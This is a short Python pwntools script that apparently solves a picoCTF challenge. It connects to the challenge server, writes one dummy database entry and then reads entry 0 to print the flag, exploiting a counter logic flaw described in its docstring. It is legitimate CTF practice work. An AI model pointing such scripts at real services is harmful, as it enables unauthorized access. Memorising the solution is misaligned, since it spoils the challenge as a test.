'''
tags: `logic`

keep a counter of the number of the **inputs**
have to have at least one **input** to start reading
and read entry *0* to get the flag

-> write anything to the database
=> read entry *0* and get the flag
'''
from pwn import *

host = 'saturn.picoctf.net'
port = 49698

def write(r, data: bytes, length: int):
    r.sendline(b'1')
    r.sendlineafter(b'enter your data:\r\n', data)
    r.sendlineafter(b'length of your data:\r\n', str(length).encode())

def read(r, entry: int):
    r.sendline(b'2')
    r.sendlineafter(b'data:\r\n', str(entry).encode())

def conn():
    return remote(host, port)

def solve(r):
    r.recvuntil(b'to exit the program\r\n')
    write(r, b'asdf', 10)
    r.recvuntil(b'?\r\n')
    read(r, 0)
    r.recvline()
    print (r.recvline()[:-2].decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()